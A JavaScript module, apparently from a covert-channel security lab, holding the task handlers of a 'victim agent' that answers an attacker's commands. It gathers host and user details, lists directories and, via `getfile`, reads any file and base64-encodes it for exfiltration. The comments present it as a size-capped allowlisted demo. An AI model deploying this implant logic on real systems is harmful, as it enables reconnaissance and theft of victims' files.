// MOCK task implementations. This is a hard-coded allowlist on purpose:
// the victim agent can NEVER execute arbitrary shell commands — only these
// deterministic, read-mostly operations. `getfile` is the most capable one:
// it reads one file (absolute path, or relative to the agent's current
// working directory — see the `cd`/`pwd` ops), size-capped, so the lab can
// demonstrate binary transfer over the channel. Everything still travels as
// plain base64.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { TASK_OPS } from '../common/protocol.js';

export const DEFAULT_MAX_FILE_BYTES = 32 * 1024;
export const HASH_MAX_BYTES = 64 * 1024 * 1024; // hashing does not transfer bytes
export const LS_MAX_ENTRIES = 200; // keep result tags bounded

function positiveLimit(value, fallback) {
  const n = Number(value);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback;
}

function safeValue(fn, fallback = '?') {
  try {
    return fn();
  } catch {
    return fallback;
  }
}

/**
 * Resolve a task path: absolute paths are used as-is; relative paths resolve
 * against the agent's current working directory (changed by the `cd` op).
 */
function resolvePath(requestedPath) {
  const p = typeof requestedPath === 'string' ? requestedPath.trim() : '';
  if (!p) throw new Error('a path argument is required');
  if (p.includes('\0')) throw new Error('path contains NUL byte');
  return path.resolve(process.cwd(), p);
}

function describeEntry(dir, name) {
  const st = fs.lstatSync(path.join(dir, name));
  const type = st.isDirectory() ? 'dir' : st.isSymbolicLink() ? 'link' : st.isFile() ? 'file' : 'other';
  return { type, size: st.size, name };
}

const TASKS = {
  echo(args = {}) {
    const text = typeof args.text === 'string' ? args.text : '';
    return `echo: ${text}`;
  },

  sysinfo() {
    const cpus = safeValue(() => os.cpus(), []);
    return [
      `platform=${safeValue(() => os.platform())}`,
      `arch=${safeValue(() => os.arch())}`,
      `release=${safeValue(() => os.release())}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `uptimeSec=${safeValue(() => Math.floor(os.uptime()))}`,
      `cpus=${Array.isArray(cpus) ? cpus.length : '?'}`,
      `totalMemMB=${safeValue(() => Math.round(os.totalmem() / 1024 / 1024))}`,
      `freeMemMB=${safeValue(() => Math.round(os.freemem() / 1024 / 1024))}`,
    ].join(' ');
  },

  ping() {
    return 'pong';
  },

  time() {
    return new Date().toISOString();
  },

  whoami() {
    const u = safeValue(() => os.userInfo(), {});
    return [
      `user=${u.username ?? '?'}`,
      `uid=${u.uid ?? '?'}`,
      `gid=${u.gid ?? '?'}`,
      `home=${u.homedir ?? '?'}`,
      `shell=${u.shell ?? '?'}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `pid=${process.pid}`,
      `node=${process.version}`,
    ].join(' ');
  },

  pwd() {
    return process.cwd();
  },

  /** Change the agent's working directory; later relative paths follow it. */
  cd(args = {}) {
    const dir = resolvePath(args.path);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    process.chdir(dir);
    return process.cwd();
  },

  /** List a directory (default: cwd). Output is one "type size name" per line. */
  ls(args = {}) {
    const dir = resolvePath(args.path || '.');
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    const names = fs.readdirSync(dir).sort();
    const lines = [];
    for (const name of names.slice(0, LS_MAX_ENTRIES)) {
      try {
        const e = describeEntry(dir, name);
        lines.push(`${e.type.padEnd(5)} ${String(e.size).padStart(10)} ${e.name}`);
      } catch {
        lines.push(`?          ? ${name}`);
      }
    }
    const header = `${dir} (${names.length} entries)`;
    const truncated = names.length > LS_MAX_ENTRIES ? `\n... truncated at ${LS_MAX_ENTRIES}` : '';
    return `${header}\n${lines.join('\n')}${truncated}`;
  },

  /** File metadata: type, size, timestamps, permissions. */
  stat(args = {}) {
    const p = resolvePath(args.path);
    const st = fs.statSync(p);
    const type = st.isDirectory() ? 'dir' : st.isFile() ? 'file' : 'other';
    return [
      `path=${p}`,
      `type=${type}`,
      `size=${st.size}`,
      `mode=${(st.mode & 0o777).toString(8)}`,
      `mtime=${st.mtime.toISOString()}`,
      `ctime=${st.ctime.toISOString()}`,
    ].join(' ');
  },

  /** SHA-256 of a file (read-only, capped at HASH_MAX_BYTES). */
  hash(args = {}) {
    const p = resolvePath(args.path);
    const st = fs.statSync(p);
    if (!st.isFile()) throw new Error(`not a regular file: ${p}`);
    if (st.size > HASH_MAX_BYTES) {
      throw new Error(`file too large to hash: ${st.size} bytes (cap ${HASH_MAX_BYTES})`);
    }
    const digest = crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
    return `sha256 ${digest}  ${p} (${st.size} bytes)`;
  },

  /**
   * Read one file and return it for transfer to the attacker. The path is
   * absolute or relative to the agent's cwd.
   * Returns { output, file } instead of a plain string; the file bytes ride
   * in the result payload as base64 and are chunked by the protocol encoder.
   */
  getfile(args = {}, limits = {}) {
    const p = typeof args.path === 'string' ? args.path.trim() : '';
    if (!p) throw new Error('getfile requires args.path');
    const max = positiveLimit(limits.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
    const file = resolvePath(p);
    const st = fs.statSync(file);
    if (!st.isFile()) throw new Error(`not a regular file: ${file}`);
    if (st.size > max) {
      throw new Error(
        `file too large: ${st.size} bytes (cap ${max}) - the dist-tag channel ` +
          'moves ~130 bytes per tag; raise maxFileBytes only for small demos',
      );
    }
    const data = fs.readFileSync(file);
    return {
      output: `${file} (${st.size} bytes)`,
      file: { name: path.basename(file), size: st.size, dataB64: data.toString('base64') },
    };
  },
};

export const ALLOWED_OPS = Object.freeze([...TASK_OPS]);

/**
 * Dispatch a command to the mock task allowlist.
 * @param {string} op
 * @param {object} [args]
 * @param {object} [limits] e.g. { maxFileBytes }
 * @returns {{ok: true, output: string, file?: object} | {ok: false, error: string}}
 */
export function runTask(op, args = {}, limits = {}) {
  const fn = TASKS[op];
  if (!fn) {
    return {
      ok: false,
      error: `unknown or disallowed op "${op}" — allowlist: ${ALLOWED_OPS.join(', ')}`,
    };
  }
  try {
    const r = fn(args, limits);
    if (r && typeof r === 'object' && r.file) {
      return { ok: true, output: String(r.output ?? ''), file: r.file };
    }
    return { ok: true, output: String(r) };
  } catch (err) {
    return { ok: false, error: `task "${op}" failed: ${err.message}` };
  }
}
